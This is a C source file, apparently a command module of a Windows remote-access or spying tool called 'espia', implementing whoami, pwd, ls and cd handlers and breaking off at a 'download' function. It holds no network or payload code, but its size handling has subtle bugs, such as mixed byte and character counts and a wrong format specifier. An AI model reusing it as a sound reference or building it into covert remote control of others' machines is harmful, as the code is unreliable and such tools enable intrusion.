#include "includes/espia_comms.h"
#include "includes/espia_func.h"

void whoami(LPWSTR buffer, INT size_buffer) {
    /* Get and append the Hostname */
    DWORD size_comp = size_buffer;
    if (GetComputerNameW(buffer, &size_comp) == 0) {
        Debug(printf("Failed to retrieve the Computer Name : %d\n", GetLastError());)
        StringCbCatW(buffer, size_buffer, L"<failed>");
        size_comp = 8;
    }

    /* Append an '@' symbol */
    StringCbCatW(buffer + size_comp, size_buffer, L"@");
    size_comp++;

    /* Get and append Username */
    DWORD size_usr = size_buffer;
    if (GetUserNameW(buffer + size_comp, &size_usr) == 0) {
        Debug(printf("Failed to retrieve the Username : %d\n", GetLastError()));
        StringCbCatW(buffer, size_buffer, L"<failed>");
    }
    StringCbCatW(buffer, size_buffer, L"\n");
    //printf("*%S*\n",buffer);
}

void pwd(LPWSTR buffer, INT size_buffer) {
    /* Get the current working directory */
    if (GetCurrentDirectoryW(size_buffer, buffer) == 0) {
        Debug(printf("Failed to retrieve the Current working directory: %d\n", GetLastError());)
        StringCbCatW(buffer, size_buffer, L"<failed>");
    }
}

/* 'ls' uses a callback function to handle file/folder output from FindNextFileW() */
void ls(INT (*callback)(PWSTR buffer, INT size_buffer)) {
    /* Get the current working directory and append '*' at the end */
    WCHAR temp_dir[MAX_PATH + 1] = L"";
    pwd(temp_dir, sizeof(temp_dir));
    StringCbCatW(temp_dir, sizeof(temp_dir), L"\\*");

    /* Get the file handler for current working dir */
    WIN32_FIND_DATAW file_data;
    HANDLE file_handle;
    if ((file_handle = FindFirstFileW(temp_dir, &file_data)) == INVALID_HANDLE_VALUE) {
        Debug(printf("FindFirstFileW() failed: %d\n", GetLastError());)
        return;
    }
    memset(temp_dir, 0, sizeof(temp_dir));

    /* Iterate over files/folders */
    LARGE_INTEGER filesize;
    do {
        /* If current file/folder is a directory */
        if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            StringCbPrintfW(temp_dir, sizeof(temp_dir), L"%s\t\t\t\t<DIR>\n", file_data.cFileName);
        } 
        /* Else, a file */
        else {
            filesize.LowPart = file_data.nFileSizeLow;
            filesize.HighPart = file_data.nFileSizeHigh;
            StringCbPrintfW(temp_dir, sizeof(temp_dir), L"%s\t\t\t\t%ld bytes\n", file_data.cFileName, filesize.QuadPart);
        }

        (*callback)(temp_dir, wcslen(temp_dir)*sizeof(WCHAR));                                         // Call the callback function to handle output
    } while (FindNextFileW(file_handle, &file_data) != 0);
}

INT cd(PSTR path, PWSTR buffer, INT size_buffer) {
    if (SetCurrentDirectoryA(path) == 0) {
        Debug(printf("Changing directory failed: %d\n", GetLastError());)
        StringCbPrintfW(buffer, size_buffer, L"Changing directory failed: %d\n", GetLastError());
        return CD_ERROR;
    }
    return ESPIA_OK;
}

INT download()